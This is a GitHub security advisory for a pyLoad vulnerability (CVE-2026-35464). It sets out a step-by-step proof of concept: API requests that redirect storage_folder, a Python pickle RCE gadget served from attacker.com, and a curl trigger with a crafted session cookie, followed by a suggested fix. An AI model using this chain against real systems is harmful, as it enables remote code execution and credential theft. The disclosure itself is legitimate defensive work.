# [H] pyLoad: Unprotected storage_folder enables arbitrary file write to Flask session store and code execution (Incomplete fix for CVE-2026-33509)

## Summary
Severity: High
Advisory: GHSA-4744-96p5-mp2j
CVE: CVE-2026-35464
CWE: CWE-502, CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-04
Source: https://github.com/advisories/GHSA-4744-96p5-mp2j
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0

## Details
## Summary

The fix for CVE-2026-33509 (GHSA-r7mc-x6x7-cqxx) added an `ADMIN_ONLY_OPTIONS` set to block non-admin users from modifying security-critical config options. The `storage_folder` option is not in this set and passes the existing path restriction because the Flask session directory is outside both PKGDIR and userdir. A user with SETTINGS and ADD permissions can redirect downloads to the Flask filesystem session store, plant a malicious pickle payload as a predictable session file, and trigger arbitrary code execution when any HTTP request arrives with the corresponding session cookie.

## Required Privileges

The chain requires a single non-admin user with both `SETTINGS` (to change `storage_folder`) and `ADD` (to submit a download URL) permissions. These are independent bitmask flags that can be assigned together by an admin. The final RCE trigger is unauthenticated: any HTTP request with the crafted session cookie causes deserialization.

## Root Cause

`storage_folder` at `src/pyload/core/api/__init__.py:238-246` has a path check that blocks writing inside PKGDIR or userdir using `os.path.realpath`. However, Flask's filesystem session directory (`/tmp/pyLoad/flask/` in the standard Docker deployment) is outside both restricted paths.

pyload configures Flask with `SESSION_TYPE = "filesystem"` at `__init__.py:127`. The cachelib `FileSystemCache` stores session files as `md5("session:" + session_id)` and deserializes them with `pickle.load()` on every request that carries the corresponding session cookie.

## Proven RCE Chain

Tested against `lscr.io/linuxserver/pyload-ng:latest` Docker image.

**Step 1** — Change download directory to Flask session store:

    POST /api/set_config_value
    {"section":"core","category":"general","option":"storage_folder","value":"/tmp/pyLoad/flask"}

The path check resolves `/tmp/pyLoad/flask/` via `realpath`. It does not start with PKGDIR (`/lsiopy/.../pyload/`) or userdir (`/config/`). Check passes.

**Step 2** — Compute the target session filename:

    md5("session:ATTACKER_SESSION_ID") = 92912f771df217fb6fbfded6705dd47c

Flask-Session uses cachelib which stores files as `md5(key_prefix + session_id)`. The default key prefix is `session:`.

**Step 3** — Host and download the malicious pickle payload:

    import pickle, os, struct
    class RCE:
        def __reduce__(self):
            return (os.system, ("id > /tmp/pyload-rce-success",))
    session = {"_permanent": True, "rce": RCE()}
    payload = struct.pack("I", 0) + pickle.dumps(session, protocol=2)
    # struct.pack("I", 0) = cachelib timeout header (0 = never expires)

Serve as `http://attacker.com/92912f771df217fb6fbfded6705dd47c` and submit:

    POST /api/add_package
    {"name":"x","links":["http://attacker.com/92912f771df217fb6fbfded6705dd47c"],"dest":1}

The file is saved to `/tmp/pyLoad/flask/92912f771df217fb6fbfded6705dd47c`.

**Step 4** — Trigger deserialization (unauthenticated):

    curl http://target:8000/ -b "pyload_session_8000=ATTACKER_SESSION_ID"

The session cookie name is `pyload_session_` + the configured port number (`__init__.py:128`).

Flask loads the session file. cachelib reads the 4-byte timeout header, confirms the entry is not expired, and calls `pickle.load()`. The RCE gadget executes.

**Result**:

    $ docker exec pyload-poc cat /tmp/pyload-rce-success
    uid=1000(abc) gid=1000(users) groups=1000(users)

## Impact

A non-admin user with SETTINGS + ADD permissions achieves arbitrary code execution as the pyload service user. The final trigger requires no authentication. The attacker can:

- Execute arbitrary commands with the privileges of the pyload process
- Read environment variables (API keys, credentials)
- Access the filesystem (download history, user database)
- Pivot to other network resources

## Suggested Fix

Add `storage_folder` to the ADMIN_ONLY set, or extend the path check to block writing to auto-consumed temporary directories (Flask session store, Jinja bytecode cache, pyload temp directory):

    ADMIN_ONLY_OPTIONS = {
        ...
        ("general", "storage_folder"),  # ADDED: prevents session poisoning RCE
        ...
    }

Also correct the existing wrong option names:

    ("webui", "ssl_certfile"),  # FIXED: was "ssl_cert" (dead code)
    ("webui", "ssl_keyfile"),   # FIXED: was "ssl_key" (dead code)

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-4744-96p5-mp2j
- https://github.com/pyload/pyload/security/advisories/GHSA-r7mc-x6x7-cqxx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33509
- https://nvd.nist.gov/vuln/detail/CVE-2026-35464
- https://github.com/pyload/pyload/commit/c4cf995a2803bdbe388addfc2b0f323277efc0e1
- https://github.com/pyload/pyload
- https://www.cve.org/CVERecord?id=CVE-2026-33509
